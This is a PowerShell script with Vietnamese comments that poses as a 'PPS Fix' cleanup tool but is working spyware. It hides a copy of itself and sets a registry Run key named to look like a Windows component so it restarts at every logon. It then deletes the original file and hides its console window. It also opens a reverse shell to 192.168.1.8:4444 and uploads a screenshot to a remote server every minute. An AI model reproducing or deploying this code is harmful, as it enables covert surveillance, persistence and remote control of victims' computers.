

# Load assemblies cho screenshot
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# -----------------------------------------------------------------
# Phần persist + ẩn file + SELF-DESTRUCT
# -----------------------------------------------------------------

$hiddenFolder    = "$env:APPDATA\Microsoft\Windows\Templates"
$scriptName      = "UpdateCache.ps1"                           
$destPath        = Join-Path $hiddenFolder $scriptName

# Tạo folder ẩn nếu chưa có
if (!(Test-Path $hiddenFolder)) {
    New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
    (Get-Item $hiddenFolder -Force).Attributes = 'Hidden'
}

$currentScript = $PSCommandPath

$copySuccess = $false

if ($currentScript -and (Test-Path $currentScript)) {
    # So sánh kích thước file để tránh copy thừa
    $sourceLength = (Get-Item $currentScript -Force).Length
    $destLength   = if (Test-Path $destPath) { (Get-Item $destPath -Force).Length } else { 0 }

    if ($sourceLength -ne $destLength) {
        Copy-Item -Path $currentScript -Destination $destPath -Force
        if (Test-Path $destPath) {
            $copySuccess = $true
            #Write-Host "Copied: $destPath" -ForegroundColor Green
        }
    } else {
        $copySuccess = $true  # đã tồn tại và giống nhau → coi như thành công
        #Write-Host "File đã tồn tại và giống hệt, bỏ qua copy." -ForegroundColor Yellow
    }
} else {
    #Write-Host "Không xác định được file hiện tại (có thể chạy từ memory/ISE)" -ForegroundColor Yellow
}

# Tạo registry Run key (chạy lúc logon) - chỉ nếu copy thành công
if ($copySuccess) {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regValueName = "Windows Template Cache"
    $regCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$destPath`""

    try {
        if (-not (Get-ItemProperty -Path $regPath -Name $regValueName -ErrorAction SilentlyContinue)) {
            New-ItemProperty -Path $regPath -Name $regValueName -Value $regCommand -PropertyType String -Force | Out-Null
            #Write-Host "Đã thêm registry autostart." -ForegroundColor Cyan
        }
    } catch {
        Write-Host "Need Admin" -ForegroundColor Red
    }
}

# Nếu copy thành công → spawn bản sao từ file ẩn và tự xóa file hiện tại
if ($copySuccess -and $currentScript -and (Test-Path $currentScript) -and ($currentScript -ne $destPath)) {
    #Write-Host "Khởi động bản sao từ vị trí ẩn và tự hủy file này..." -ForegroundColor Magenta
    
    # Spawn instance mới (ẩn hoàn toàn) từ file đã copy
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$destPath`"" -NoNewWindow
    
    # Đợi chút để instance mới khởi động ổn
    Start-Sleep -Milliseconds 800
    
    # Tự xóa file hiện tại
    Remove-Item -Path $currentScript -Force -ErrorAction SilentlyContinue
    
    # Thoát ngay lập tức instance cũ
    exit
}

# -----------------------------------------------------------------
# Từ đây trở đi chỉ chạy nếu là instance "ẩn" (đã copy xong)
# -----------------------------------------------------------------

Write-Host "PPS Fix is running… Performing system cleanup…" -ForegroundColor Green
Start-Sleep -Seconds 2

Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "Temporary files cleaned up." -ForegroundColor Yellow

# Folder lưu dữ liệu (ẩn)
$watchFolder = "$env:APPDATA\PPS_Watcher"
if (!(Test-Path $watchFolder)) { 
    New-Item -Path $watchFolder -ItemType Directory -Force | Out-Null 
    (Get-Item $watchFolder -Force).Attributes = 'Hidden'
}
$logFile = "$watchFolder\Watcher_Log.txt"

"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - PPS start (persist + hidden). User: $env:USERNAME" | Out-File -FilePath $logFile -Encoding utf8 -Append


[System.Windows.Forms.MessageBox]::Show(
    "PPS Done!!!",
    "PPS The Watcher",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Information
)

# $url = "https://github.com/int0x33/nc.exe/archive/refs/heads/master.zip"
# $out = "$env:APPDATA\nc.zip"

# Invoke-WebRequest -Uri $url -OutFile $out

# Expand-Archive -Path "$env:APPDATA\nc.zip" -DestinationPath "$env:APPDATA\nc"
 

# reverse shell
$client = New-Object System.Net.Sockets.TCPClient('192.168.1.8',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Hàm chụp màn hình
function Take-PPSScreenshot {
    param ([string]$savePath)
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
    $bitmap.Save($savePath, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
}

# Ẩn console (dự phòng)
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)




# Vòng lặp chính
while ($true) {
    $time = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
    $screenshotPath = "$watchFolder\Screen_$time.png"

    Take-PPSScreenshot -savePath $screenshotPath

    "$time - Chụp: $screenshotPath | Processes: $((Get-Process).Count)" | Out-File -FilePath $logFile -Append -Encoding utf8
    curl.exe -X POST -F "file=@$screenshotPath" http://192.168.1.8:8000/upload

    # # 
    # if ((Get-Random -Minimum 1 -Maximum 9) -eq 1) {
    #     [System.Windows.Forms.MessageBox]::Show(
    #         "PPS vừa chụp màn hình lúc $time. Folder $watchFolder vẫn an toàn... đừng xóa nha 👀",
    #         "PPS Watcher",
    #         [System.Windows.Forms.MessageBoxButtons]::OK,
    #         [System.Windows.Forms.MessageBoxIcon]::Warning
    #     )
    # }

    Start-Sleep -Seconds 60
}